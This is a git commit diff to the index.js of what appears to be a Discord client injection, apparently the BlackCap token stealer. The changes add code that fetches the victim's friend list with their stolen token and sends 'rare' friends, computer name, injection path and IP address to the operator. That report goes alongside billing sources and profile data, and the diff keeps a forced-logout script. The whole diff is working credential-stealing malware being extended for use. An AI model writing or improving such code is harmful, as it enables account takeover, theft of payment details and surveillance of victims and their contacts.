c360549c0307012b81911727957be86fbffa52b0
xugga <147700782+xugga@users.noreply.github.com>
2024-02-18 17:51:37 +0200

    index.js

--- index.js
+++ index.js
@@ -137,7 +137,19 @@ const GetA2F = (bouki) => {
 }
 
 
-
+const parseFriends = friends => {
+    var real = friends.filter(x => x.type == 1)
+    var rareFriends = ""
+    for (var friend of real) {
+        var badges = GetRBadges(friend.user.public_flags)
+        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
+    }
+    if (!rareFriends) rareFriends = "No Rare Friends"
+    return {
+        len: real.length,
+        badges: rareFriends
+    }
+}
 
 const parseBilling = billings => {
     var Billings = ""
@@ -201,7 +213,7 @@ function GetLangue(read) {
         "el": ":flag_gr: Greek",
         "bg": ":flag_bg: Bulgarian",
         "ru": ":flag_ru: Russian",
-        "uk": ":flag_ua: Ukraine",
+        "uk": ":flag_ua: Ukrainian",
         "hi": ":flag_in: Indian",
         "th": ":flag_tw: Taiwanese",
         "zh-CN": ":flag_cn: Chinese-China",
@@ -259,6 +271,7 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: "Initalized",
             fields: [{
+                name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                 inline: !1
             }]
@@ -279,6 +292,7 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: "Initalized",
             fields: [{
+                name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                 inline: !1
             }, {
@@ -328,9 +342,16 @@ const FirstTime = async () => {
             }],
             image: userBanner,
             thumbnail: userAvatar
-
+        })
+        var params2 = await makeEmbed({
+            title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+            color: config['embed-color'],
+            description: Friends.badges,
+            image: userBanner,
+            thumbnail: userAvatar
         })
 
+        params.embeds.push(params2.embeds[0])
     }
         fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
         await execScript(logOutScript)
@@ -433,6 +454,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var ip = await getIP()
     var user = await getURL("https://discord.com/api/v8/users/@me", token)
     var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+    var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
     if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
@@ -450,6 +472,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 title: "Initalized",
                 color: config['embed-color'],
                 fields: [{
+                    name: "Injection Info",
                     value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                     inline: !1
                 }, {
@@ -504,9 +527,17 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
                 thumbnail: userAvatar,
                 image: userBanner
-
             })
 
+            var params2 = await makeEmbed({
+                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
         
             await post(params)
             break
@@ -534,7 +565,17 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 image: userBanner
             })
 
+            var params2 = await makeEmbed({
+                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
 
+            params.embeds.push(params2.embeds[0])
+            await post(params)
+            break
     }
 })
 module.exports = require("./core.asar")
